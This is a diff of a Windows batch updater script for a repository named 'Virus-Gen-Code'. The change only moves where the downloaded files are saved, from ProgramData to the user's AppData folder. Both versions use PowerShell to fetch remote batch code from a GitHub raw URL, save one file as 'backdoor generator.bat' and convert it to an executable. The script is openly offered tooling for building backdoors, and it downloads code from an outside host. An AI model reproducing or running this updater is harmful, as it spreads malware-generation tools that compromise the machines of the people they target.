@@ -8,11 +8,11 @@ if exist "C:\users\%username%\AppData\base_environment_location.txt" (< "C:\user
 echo starting update...
 timeout 1 /NOBREAK>nul
 echo creating bat2exe command...
-Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/bat2exe.bat").Content >C:\ProgramData\bat2exe.bat
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/bat2exe.bat").Content >"C:\users\%username%\appdata\bat2exe.bat"
 echo bat2exe succesfuly made
 if not exist %install_location% mkdir %install_location%
 echo downloading code...
-Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/updater.bat").Content >"C:\programdata\backdoor generator.bat"
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/updater.bat").Content >"C:\users\%username%\appdata\backdoor generator.bat"
 echo converting file to exe...
 call bat2exe.bat "backdoor generator.bat" "backdoor generator.exe"
 timeout 2 /nobreak >nul
